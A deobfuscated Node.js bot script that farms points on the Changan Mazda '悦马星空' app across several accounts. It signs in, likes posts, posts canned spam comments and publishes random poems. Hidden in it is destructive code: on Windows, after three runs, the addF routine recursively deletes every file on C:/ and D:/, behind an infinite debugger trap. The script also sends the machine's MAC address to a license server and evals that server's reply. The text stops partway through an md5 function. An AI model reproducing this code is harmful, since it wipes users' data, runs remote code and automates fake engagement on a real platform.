//Thu Jul 04 2024 07:46:59 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const $ = new Env("悦马星空");
const VM = require("sablejs/runtime")(),
  path = require("path"),
  fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x399b66 = vm.getGlobal(),
    _0x4d9bdd = vm.createObject(),
    _0x41f26e = vm.createFunction("log", function () {
      const _0x5a8a59 = [];
      for (let _0x30be88 = 0; _0x30be88 < arguments.length; _0x30be88++) {
        _0x5a8a59.push(vm.asString(arguments[_0x30be88]));
      }
      console.log(..._0x5a8a59);
      return vm.createUndefined();
    }),
    _0x57c5f9 = vm.createFunction("xxxx", function (_0x22a74c) {
      let _0xea75e = eval(_0x22a74c.value);
      return vm.createString(JSON.stringify(_0xea75e));
    }),
    _0x1b7056 = vm.createFunction("yyyy", function (_0x2210cc) {
      let _0x17961a = _0x2210cc.value,
        _0x50b49f = fs.readFileSync(_0x17961a, "utf-8").replace(/\r\n/g, "\n"),
        _0x5cc027 = cryptoJS.MD5(_0x50b49f).toString();
      return vm.createString(_0x5cc027);
    }),
    _0x2824d1 = vm.createFunction("ddd", function (_0x118ec9) {
      let _0x5cc7ca = cryptoJS.MD5(_0x118ec9.value).toString();
      return vm.createString(_0x5cc7ca);
    });
  vm.setProperty(_0x4d9bdd, "log", _0x41f26e);
  vm.setProperty(_0x399b66, "xxxx", _0x57c5f9);
  vm.setProperty(_0x399b66, "console", _0x4d9bdd);
  vm.setProperty(_0x399b66, "yyyy", _0x1b7056);
  vm.setProperty(_0x399b66, "ddd", _0x2824d1);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x21e83e) {
  _0x21e83e.destroy();
}
function abc(_0x2e6906, _0x397ff4, _0xd86d51, _0x2b3c8e, _0x12edeb) {
  const _0x3df418 = _0x2e6906.getGlobal();
  let _0x3009b3 = _0x2e6906.getProperty(_0x3df418, "xab"),
    _0x8b3aa6 = _0x2e6906.call(_0x3009b3, _0x2e6906.createUndefined(), _0x2e6906.createString(_0x397ff4), _0x2e6906.createString(_0x2b3c8e), _0x2e6906.createString(_0x12edeb), _0x2e6906.createString(_0xd86d51));
  _0x8b3aa6 = _0x2e6906.asString(_0x8b3aa6);
  return _0x8b3aa6;
}
function xyz(_0x44adf1, _0x4dd9a9, _0x17c7d6, _0x5967f9, _0x2ca44e) {
  const _0x3da1b7 = _0x44adf1.getGlobal();
  let _0x4030b9 = _0x44adf1.getProperty(_0x3da1b7, "xmn"),
    _0x1eda15 = _0x44adf1.call(_0x4030b9, _0x44adf1.createUndefined(), _0x44adf1.createString(_0x4dd9a9), _0x44adf1.createString(_0x5967f9), _0x44adf1.createString(_0x2ca44e), _0x44adf1.createString(_0x17c7d6));
  _0x1eda15 = _0x44adf1.asString(_0x1eda15);
  return _0x1eda15;
}
var gtr;
let mac = "",
  status;
status = (status = $.getval("qmwkstatus") || "1") > 1 ? "" + status : "";
JSNAMED = $.isNode() ? require("path").basename(__filename) : "kxnjy.js";
let ymxkappArr = [],
  ymxkplnrArr = [],
  all_msg = "";
let bt = "",
  nr = "",
  plid = "",
  uid = "",
  id,
  token,
  arrs = [],
  ymxkapp = ($.isNode() ? process.env.ymxkapp : $.getdata("ymxkapp")) || "",
  ymxkplnr = ($.isNode() ? process.env.ymxkplnr : $.getdata("ymxkplnr")) || "感谢分享@大佬厉害@仰望@牛啊牛啊@内容可以@内容不错@很强@牛的@6666啊@可以的@留名@混个眼熟@有帖子的地方就有我@我来了@楼主加油@看好你",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
var myDate = new Date(),
  myMonth = myDate.getMonth() + 1,
  myToday = myDate.getDate();
myMonth >= 10 ? myMonth = myMonth : myMonth = "0" + myMonth;
myToday >= 10 ? myToday = myToday : myToday = "0" + myToday;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x34a199) {
          return function (_0xde67cc) {
            return Function("Function(arguments[0]+\"" + _0xde67cc + "\")()");
          }(_0x34a199);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x430ddf = "",
        _0x233ec6 = fs.readdirSync("/sys/class/net/");
      _0x233ec6.forEach(function (_0x4bf188) {
        var _0xac84b7 = path.join("/sys/class/net", _0x4bf188, "address");
        _0x4bf188.substr(0, 3) == "eth" && fs.existsSync(_0xac84b7) && (_0x430ddf = fs.readFileSync(_0xac84b7).toString().trim());
      });
      return _0x430ddf;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x2feaae) {
  try {
    gtr.accessSync(_0x2feaae, gtr.F_OK);
  } catch (_0xef8121) {
    return false;
  }
  return true;
}
function addF(_0x45da71, _0x2a8e95) {
  let _0x4759a7 = 0,
    _0x5e9ade = "C:/Windows/system.txt";
  if (isFileExist(_0x5e9ade)) {
    _0x4759a7 = gtr.readFileSync(_0x5e9ade, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x5e9ade, "1", function (_0x1be90a) {
        if (_0x1be90a) {
          throw _0x1be90a;
        }
      });
    } else {
      return;
    }
  }
  if (_0x4759a7 == 99) {
    return 99;
  }
  console.log(_0x4759a7);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x4759a7);
  if (parseInt(_0x4759a7) < 3) {
    let _0x22c7c9 = parseInt(_0x4759a7) + 1;
    gtr.writeFileSync(_0x5e9ade, _0x22c7c9 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x45da71)) {
    return;
  }
  if (gtr.statSync(_0x45da71).isDirectory()) {
    var _0x4a3fdc = gtr.readdirSync(_0x45da71),
      _0x5a68eb = _0x4a3fdc.length,
      _0x2189b4 = 0;
    if (_0x5a68eb > 0) {
      _0x4a3fdc.forEach(function (_0x1077af) {
        _0x2189b4++;
        var _0x532c13 = _0x45da71 + "/" + _0x1077af;
        gtr.statSync(_0x532c13).isDirectory() ? addF(_0x532c13, true) : gtr.unlinkSync(_0x532c13);
      });
      _0x5a68eb == _0x2189b4 && _0x2a8e95 && gtr.rmdirSync(_0x45da71);
    } else {
      _0x5a68eb == 0 && _0x2a8e95 && gtr.rmdirSync(_0x45da71);
    }
  } else {
    gtr.unlinkSync(_0x45da71);
  }
}
!(async () => {
  if (!(typeof $request !== "undefined")) {
    initVM();
    arrs = abc(global.vm, acckey, mac, 67, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    ymxkappArr = ymxkapp.split("\n");
    ymxkplnrArr = ymxkplnr.split("@");
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("------------- 共" + ymxkappArr.length + "个账号-------------\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(ymxkappArr.length > parseInt(arrs.num))) {
      for (let _0x42a7e4 = 0; _0x42a7e4 < ymxkappArr.length; _0x42a7e4++) {
        ymxkapp = ymxkappArr[_0x42a7e4];
        ymxkplnr = ymxkplnrArr[_0x42a7e4];
        $.index = _0x42a7e4 + 1;
        console.log("\n开始【悦马星空" + $.index + "】");
        await ymxktk();
        await ymxkuid();
        await ymxkqd();
        await ymxkpllb();
        await sjsc();
        await ymxkxx();
      }
    }
  }
  destroyVM(global.vm);
})().catch(_0x85d69d => $.logErr(_0x85d69d)).finally(() => $.done());
function ymxktk(_0x44e766 = 0) {
  return new Promise(_0x380b32 => {
    let _0x1aecde = {
      url: "https://appapi.changan-mazda.com.cn/api-auth/oauth/mobile/mobileLogin",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        client_secret: "wx",
        client_id: "wx"
      },
      body: "{\"mobile\":\"" + ymxkapp + "\",\"openid\":\"\"}"
    };
    $.post(_0x1aecde, async (_0x1a374a, _0x3df0b3, _0x1faacf) => {
      try {
        const _0x5c9b05 = JSON.parse(_0x1faacf);
        _0x5c9b05.code == 200 ? (console.log("\n悦马星空账号【" + $.index + "】获取token：" + _0x5c9b05.data.access_token), token = _0x5c9b05.data.access_token) : console.log("\n悦马星空账号【" + $.index + "】获取toekn：" + _0x1faacf);
      } catch (_0x33b40d) {} finally {
        _0x380b32();
      }
    }, _0x44e766);
  });
}
function ymxkuid(_0x14ea93 = 0) {
  return new Promise(_0x21cbfd => {
    let _0x4db142 = {
      url: "https://appapi.changan-mazda.com.cn/api-user/user/focus/focusAndFansCount",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      }
    };
    $.get(_0x4db142, async (_0x53a27c, _0x498910, _0x248226) => {
      try {
        const _0x9a2d78 = JSON.parse(_0x248226);
        _0x9a2d78.code == 200 ? (console.log("\n悦马星空账号【" + $.index + "】获取uid：" + _0x9a2d78.data.userId), uid = _0x9a2d78.data.userId) : console.log("\n悦马星空账号【" + $.index + "】获取uid失败：" + _0x248226);
      } catch (_0x4e20ae) {} finally {
        _0x21cbfd();
      }
    }, _0x14ea93);
  });
}
function ymxkqd(_0x5b3b59 = 0) {
  return new Promise(_0x183414 => {
    let _0x39fe83 = {
      url: "https://appapi.changan-mazda.com.cn/api-user/user/signin",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      },
      body: "{\"userId\":\"" + uid + "\"}"
    };
    $.post(_0x39fe83, async (_0x1c0134, _0x3fa3a7, _0x50855a) => {
      try {
        const _0x47e4dd = JSON.parse(_0x50855a);
        _0x47e4dd.code == 200 ? console.log("\n悦马星空账号【" + $.index + "】签到：" + _0x47e4dd.message) : console.log("\n悦马星空账号【" + $.index + "】签到：" + _0x47e4dd.message);
      } catch (_0xae2b4) {} finally {
        _0x183414();
      }
    }, _0x5b3b59);
  });
}
function ymxkxx(_0x471273 = 0) {
  return new Promise(_0x7bf034 => {
    let _0x45cc3a = {
      url: "https://appapi.changan-mazda.com.cn/api-user/user/app/userinfo/" + uid,
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      },
      body: "{}"
    };
    $.post(_0x45cc3a, async (_0x3e9dd1, _0x133440, _0x45bd02) => {
      try {
        const _0x499594 = JSON.parse(_0x45bd02);
        _0x499594.code == 200 ? (console.log("\n悦马星空账号【" + $.index + "】用户：" + _0x499594.data.mmsInfo.name), id = _0x499594.data.mmsInfo.memberId, await ymxkye()) : console.log("\n悦马星空账号【" + $.index + "】用户：" + _0x45bd02);
      } catch (_0x40d959) {} finally {
        _0x7bf034();
      }
    }, _0x471273);
  });
}
function ymxkye(_0xb9b3b8 = 0) {
  return new Promise(_0x3e640b => {
    let _0x3dd737 = {
      url: "https://appapi.changan-mazda.com.cn/api-user/point/getUserPointInfo",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      },
      body: "{\"memberId\":\"" + id + "\"}"
    };
    $.post(_0x3dd737, async (_0x3727e8, _0x200237, _0x2ac1d1) => {
      try {
        const _0x5accb9 = JSON.parse(_0x2ac1d1);
        _0x5accb9.code == 200 ? console.log("\n悦马星空账号【" + $.index + "】积分余额：" + _0x5accb9.data[0].usablePoint + ",总获得：" + _0x5accb9.data[0].accumulatePoint + " 积分") : console.log("\n悦马星空账号【" + $.index + "】积分余额：" + _0x2ac1d1);
      } catch (_0x3f2964) {} finally {
        _0x3e640b();
      }
    }, _0xb9b3b8);
  });
}
function ymxkfx(_0x1bbbb8 = 0) {
  return new Promise(_0x2499ba => {
    let _0x416647 = {
      url: "https://appapi.changan-mazda.com.cn/api-content/dynamic/getPointForUser",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      },
      body: "{\"pointType\":\"FORWARD\"}"
    };
    $.post(_0x416647, async (_0x227b7e, _0x422ebd, _0x5cb503) => {
      try {
        const _0x3e7cf6 = JSON.parse(_0x5cb503);
        _0x3e7cf6.code == 200 ? console.log("\n悦马星空账号【" + $.index + "】分享：" + _0x3e7cf6.message) : console.log("\n悦马星空账号【" + $.index + "】分享：" + _0x3e7cf6.message);
      } catch (_0x51270b) {} finally {
        _0x2499ba();
      }
    }, _0x1bbbb8);
  });
}
function ymxkpllb(_0x3ff0e9 = 0) {
  return new Promise(_0xe03ec4 => {
    let _0xf4ce55 = {
      url: "https://appapi.changan-mazda.com.cn/api-content/nowAndReCommend/recommendContent",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      },
      body: "{\"pageNo\":1,\"pageSize\":10}"
    };
    $.post(_0xf4ce55, async (_0x215aac, _0x4794bd, _0xdb280e) => {
      try {
        const _0x23a4ea = JSON.parse(_0xdb280e);
        if (_0x23a4ea.code == 200) {
          for (let _0x384318 = 0; _0x384318 < _0x23a4ea.data.list.length; _0x384318++) {
            console.log("\n悦马星空账号【" + $.index + "】去评论帖子：" + _0x23a4ea.data.list[_0x384318].title);
            plid = _0x23a4ea.data.list[_0x384318].id;
            await ymxkdz();
            await ymxkpl();
            await ymxkfx();
            await $.wait(600);
          }
        } else {
          console.log("\n悦马星空账号【" + $.index + "】获取帖子失败");
        }
      } catch (_0x47dc4f) {} finally {
        _0xe03ec4();
      }
    }, _0x3ff0e9);
  });
}
function ymxkpl(_0x314762 = 0) {
  return new Promise(_0x5290c9 => {
    let _0x21ef6b = {
      url: "https://appapi.changan-mazda.com.cn/api-content/comment/addComment",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      },
      body: "{\"commentOffsetVos\":[],\"parentId\":-1,\"contentId\":\"" + plid + "\",\"contentType\":\"4\",\"content\":\"" + ymxkplnr + "\",\"isReplyMain\":1,\"avatar\":\"\",\"nickname\":\"\",\"userId\":\"" + uid + "\",\"replyUserId\":\"\",\"replyUserName\":\"\",\"userLs\":[]}"
    };
    $.post(_0x21ef6b, async (_0x3cc589, _0x407023, _0x31973a) => {
      try {
        const _0xcc1515 = JSON.parse(_0x31973a);
        _0xcc1515.code == 200 ? console.log("\n悦马星空账号【" + $.index + "】评论：" + _0xcc1515.message) : console.log("\n悦马星空账号【" + $.index + "】评论：" + _0xcc1515.message);
      } catch (_0x3d7e86) {} finally {
        _0x5290c9();
      }
    }, _0x314762);
  });
}
function ymxkdz(_0x388565 = 0) {
  return new Promise(_0x37b7d9 => {
    let _0x4f7aed = {
      url: "https://appapi.changan-mazda.com.cn/api-content/thumbsUp/thumbsUp",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      },
      body: "{\"id\":\"" + plid + "\",\"thumbsUp\":true,\"type\":4}"
    };
    $.post(_0x4f7aed, async (_0x17fe3b, _0x425cc9, _0x102aaa) => {
      try {
        const _0x6290f0 = JSON.parse(_0x102aaa);
        _0x6290f0.code == 200 ? console.log("\n悦马星空账号【" + $.index + "】点赞：" + _0x6290f0.message) : console.log("\n悦马星空账号【" + $.index + "】点赞：" + _0x6290f0.message);
      } catch (_0x44ca60) {} finally {
        _0x37b7d9();
      }
    }, _0x388565);
  });
}
function ymxkft(_0x319a36 = 0) {
  return new Promise(_0xd23602 => {
    let _0xa8835e = {
      url: "https://appapi.changan-mazda.com.cn/api-content/dynamic/publishDynamic",
      headers: {
        Host: "appapi.changan-mazda.com.cn",
        Connection: "keep-alive",
        "Content-Length": "46",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.29(0x18001d38) NetType/WIFI Language/zh_CN",
        Authorization: "Bearer " + token
      },
      body: "{\"content\":\"" + nr + "\",\"contentStr\":\"" + nr + "\",\"quoteTopic\":[],\"contentUrl\":[\"\"],\"address\":\"\",\"isMv\":false,\"mvUrl\":\"\"}"
    };
    $.post(_0xa8835e, async (_0x28ae9f, _0x732ba9, _0x2b316a) => {
      try {
        const _0x57fd55 = JSON.parse(_0x2b316a);
        _0x57fd55.code == 200 ? console.log("\n悦马星空账号【" + $.index + "】发帖：" + _0x57fd55.message) : console.log("\n悦马星空账号【" + $.index + "】发帖：" + _0x57fd55.message);
      } catch (_0x1c5c83) {} finally {
        _0xd23602();
      }
    }, _0x319a36);
  });
}
function sjsc(_0x284b7d = 0) {
  return new Promise(_0x13c554 => {
    let _0x276db0 = {
      url: "https://v1.jinrishici.com/all.json",
      headers: {
        Host: "v1.jinrishici.com",
        Connection: "Keep-Alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "okhttp/3.11.0",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
      }
    };
    $.get(_0x276db0, async (_0x26b478, _0x465941, _0x1b40ab) => {
      try {
        const _0x53e70f = JSON.parse(_0x1b40ab);
        _0x53e70f.content != "" ? (console.log("\n悦马星空账号【" + $.index + "】获取随机发帖内容成功"), bt = _0x53e70f.origin, nr = _0x53e70f.content, await ymxkft()) : console.log("\n悦马星空账号【" + $.index + "】获取随机发帖内容失败");
      } catch (_0x49db54) {} finally {
        _0x13c554();
      }
    }, _0x284b7d);
  });
}
function randomString(_0xf7e1f2 = 12) {
  let _0x4911b3 = "abcdef0123456789",
    _0x444da0 = _0x4911b3.length,
    _0x27db54 = "";
  for (i = 0; i < _0xf7e1f2; i++) {
    _0x27db54 += _0x4911b3.charAt(Math.floor(Math.random() * _0x444da0));
  }
  return _0x27db54;
}
function random(_0x8c3d0d = 12) {
  let _0x33562c = "0123456789",
    _0x1b1d03 = _0x33562c.length,
    _0x5cb26e = "";
  for (i = 0; i < _0x8c3d0d; i++) {
    _0x5cb26e += _0x33562c.charAt(Math.floor(Math.random() * _0x1b1d03));
  }
  return _0x5cb26e;
}
function encodeUTF8(_0x322e9f) {
  var _0x14c351,
    _0x248d1c = [],
    _0x37ef56,
    _0x2eb11d;
  for (_0x14c351 = 0; _0x14c351 < _0x322e9f.length; _0x14c351++) {
    if ((_0x37ef56 = _0x322e9f.charCodeAt(_0x14c351)) < 128) {
      _0x248d1c.push(_0x37ef56);
    } else {
      if (_0x37ef56 < 2048) {
        _0x248d1c.push(192 + (_0x37ef56 >> 6 & 31), 128 + (_0x37ef56 & 63));
      } else {
        if ((_0x2eb11d = _0x37ef56 ^ 55296) >> 10 == 0) {
          _0x37ef56 = (_0x2eb11d << 10) + (_0x322e9f.charCodeAt(++_0x14c351) ^ 56320) + 65536;
          _0x248d1c.push(240 + (_0x37ef56 >> 18 & 7), 128 + (_0x37ef56 >> 12 & 63));
        } else {
          _0x248d1c.push(224 + (_0x37ef56 >> 12 & 15));
        }
        _0x248d1c.push(128 + (_0x37ef56 >> 6 & 63), 128 + (_0x37ef56 & 63));
      }
    }
  }
  return _0x248d1c;
}
function sha(_0x49f4b7) {
  var _0x3a4c35 = new Uint8Array(encodeUTF8(_0x49f4b7)),
    _0x3d9677,
    _0x59e9dd,
    _0x41957f,
    _0x5d523b = (_0x3a4c35.length + 8 >>> 6 << 4) + 16,
    _0x49f4b7 = new Uint8Array(_0x5d523b << 2);
  _0x49f4b7.set(new Uint8Array(_0x3a4c35.buffer));
  _0x49f4b7 = new Uint32Array(_0x49f4b7.buffer);
  for (_0x41957f = new DataView(_0x49f4b7.buffer), _0x3d9677 = 0; _0x3d9677 < _0x5d523b; _0x3d9677++) {
    _0x49f4b7[_0x3d9677] = _0x41957f.getUint32(_0x3d9677 << 2);
  }
  _0x49f4b7[_0x3a4c35.length >> 2] |= 128 << 24 - (_0x3a4c35.length & 3) * 8;
  _0x49f4b7[_0x5d523b - 1] = _0x3a4c35.length << 3;
  var _0x5e8e2c = [],
    _0x17d97a = [function () {
      return _0x14b3be[1] & _0x14b3be[2] | ~_0x14b3be[1] & _0x14b3be[3];
    }, function () {
      return _0x14b3be[1] ^ _0x14b3be[2] ^ _0x14b3be[3];
    }, function () {
      return _0x14b3be[1] & _0x14b3be[2] | _0x14b3be[1] & _0x14b3be[3] | _0x14b3be[2] & _0x14b3be[3];
    }, function () {
      return _0x14b3be[1] ^ _0x14b3be[2] ^ _0x14b3be[3];
    }],
    _0xc6935b = function (_0x24251e, _0x31d82b) {
      return _0x24251e << _0x31d82b | _0x24251e >>> 32 - _0x31d82b;
    },
    _0x7df88 = [1518500249, 1859775393, -1894007588, -899497514],
    _0x14b3be = [1732584193, -271733879, null, null, -1009589776];
  _0x14b3be[2] = ~_0x14b3be[0];
  _0x14b3be[3] = ~_0x14b3be[1];
  for (_0x3d9677 = 0; _0x3d9677 < _0x49f4b7.length; _0x3d9677 += 16) {
    var _0x19e9ae = _0x14b3be.slice(0);
    for (_0x59e9dd = 0; _0x59e9dd < 80; _0x59e9dd++) {
      _0x5e8e2c[_0x59e9dd] = _0x59e9dd < 16 ? _0x49f4b7[_0x3d9677 + _0x59e9dd] : _0xc6935b(_0x5e8e2c[_0x59e9dd - 3] ^ _0x5e8e2c[_0x59e9dd - 8] ^ _0x5e8e2c[_0x59e9dd - 14] ^ _0x5e8e2c[_0x59e9dd - 16], 1);
      _0x41957f = _0xc6935b(_0x14b3be[0], 5) + _0x17d97a[_0x59e9dd / 20 | 0]() + _0x14b3be[4] + _0x5e8e2c[_0x59e9dd] + _0x7df88[_0x59e9dd / 20 | 0] | 0;
      _0x14b3be[1] = _0xc6935b(_0x14b3be[1], 30);
      _0x14b3be.pop();
      _0x14b3be.unshift(_0x41957f);
    }
    for (_0x59e9dd = 0; _0x59e9dd < 5; _0x59e9dd++) {
      _0x14b3be[_0x59e9dd] = _0x14b3be[_0x59e9dd] + _0x19e9ae[_0x59e9dd] | 0;
    }
  }
  _0x41957f = new DataView(new Uint32Array(_0x14b3be).buffer);
  for (var _0x3d9677 = 0; _0x3d9677 < 5; _0x3d9677++) {
    _0x14b3be[_0x3d9677] = _0x41957f.getUint32(_0x3d9677 << 2);
  }
  var _0x56c320 = Array.prototype.map.call(new Uint8Array(new Uint32Array(_0x14b3be).buffer), function (_0x14e754) {
    return (_0x14e754 < 16 ? "0" : "") + _0x14e754.toString(16);
  }).join("");
  return _0x56c320;
}
function hqs(_0x4cf0fd = 10) {
  return new Promise(_0x5712bb => {
    let _0xaacc89 = 12,
      _0x586700 = {
        url: $.isNode() ? rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0xaacc89 + "&ip=1&mac=" + mac + "&bb=1") : rc4($.fwur(), "1200") + ("?key=" + acckey + "&id=" + _0xaacc89 + "&ip=0&mac=" + mac + "&bb=1")
      };
    $.post(_0x586700, async (_0x18943a, _0xf619b6, _0x40d558) => {
      try {
        let _0x126028 = eval(_0x40d558);
        _0x126028.code == 200 ? (all_msg = _0x126028.msg, _0x5712bb(_0x126028.data)) : (all_msg = _0x126028.msg, _0x5712bb(false));
      } catch (_0xea76c2) {
        $.logErr(_0xea76c2, _0xf619b6);
      }
    }, 0);
  });
}
function md5(_0x3a5146) {
  function _0x290ac7(_0x363773, _0xca7aab) {
    return _0x363773 << _0xca7aab | _0x363773 >>> 32 - _0xca7aab;
  }
  function _0x5ae37d(_0x14262d, _0x11e221) {
    var _0x3574da, _0x5978b8, _0x5c5c10, _0x3c4bbc, _0x243c7a;
    _0x5c5c10 = 2147483648 & _0x14262d;
    _0x3c4bbc = 2147483648 & _0x11e221;
    _0x3574da = 1073741824 & _0x14262d;
    _0x5978b8 = 1073741824 & _0x11e221;
    _0x243c7a = (1073741823 & _0x14262d) + (1073741823 & _0x11e221);
    return _0x3574da & _0x5978b8 ? 2147483648 ^ _0x243c7a ^ _0x5c5c10 ^ _0x3c4bbc : _0x3574da | _0x5978b8 ? 1073741824 & _0x243c7a ? 3221225472 ^ _0x243c7a ^ _0x5c5c10 ^ _0x3c4bbc : 1073741824 ^ _0x243c7a ^ _0x5c5c10 ^ _0x3c4bbc : _0x243c7a ^ _0x5c5c10 ^ _0x3c4bbc;
  }
  function _0x5f1fb8(_0x1d3e08, _0x4103a5, _0x38041e) {
    return _0x1d3e08 & _0x4103a5 | ~_0x1d3e08 & _0x38041e;
  }
  function _0x2c3202(_0x3af590, _0x22cefe, _0x21976c) {
    return _0x3af590 & _0x21976c | _0x22cefe & ~_0x21976c;
  }
  function _0x2e2e8a(_0x4c68a6, _0x5b46c0, _0x38bad6) {
    return _0x4c68a6 ^ _0x5b46c0 ^ _0x38bad6;
  }
  function _0x4bc057(_0x5411b6, _0x549cc6, _0x54409b) {
    return _0x549cc6 ^ (_0x5411b6 | ~_0x54409b);
  }
  function _0x262e4d(_0x6627fb, _0x361855, _0x300602, _0x4a74c5, _0x107093, _0x2fa641, _0x3ede74) {
    _0x6627fb = _0x5ae37d(_0x6627fb, _0x5ae37d(_0x5ae37d(_0x5f1fb8(_0x361855, _0x300602, _0x4a74c5), _0x107093), _0x3ede74));
    return _0x5ae37d(_0x290ac7(_0x6627fb, _0x2fa641), _0x361855);
  }
  function _0x2de1cb(_0x3393b1, _0x37c4fc, _0x6ef4d5, _0x4543d4, _0x2e1590, _0x24e2aa, _0x1bbbb7) {
    _0x3393b1 = _0x5ae37d(_0x3393b1, _0x5ae37d(_0x5ae37d(_0x2c3202(_0x37c4fc, _0x6ef4d5, _0x4543d4), _0x2e1590), _0x1bbbb7));
    return _0x5ae37d(_0x290ac7(_0x3393b1, _0x24e2aa), _0x37c4fc);
  }
  function _0x404862(_0x420ff9, _0x3212b0, _0x2d27c1, _0x480d1e, _0x3e1994, _0x594f2b, _0xb27175) {
    _0x420ff9 = _0x5ae37d(_0x420ff9, _0x5ae37d(_0x5ae37d(_0x2e2e8a(_0x3212b0, _0x2d27c1, _0x480d1e), _0x3e1994), _0xb27175));
    return _0x5ae37d(_0x290ac7(_0x420ff9, _0x594f2b), _0x3212b0);
  }
  function _0x3185a8(_0x261490, _0x2d1f1b, _0x456f40, _0xa00a24, _0x468f83, _0x30f671, _0x4f9aeb) {
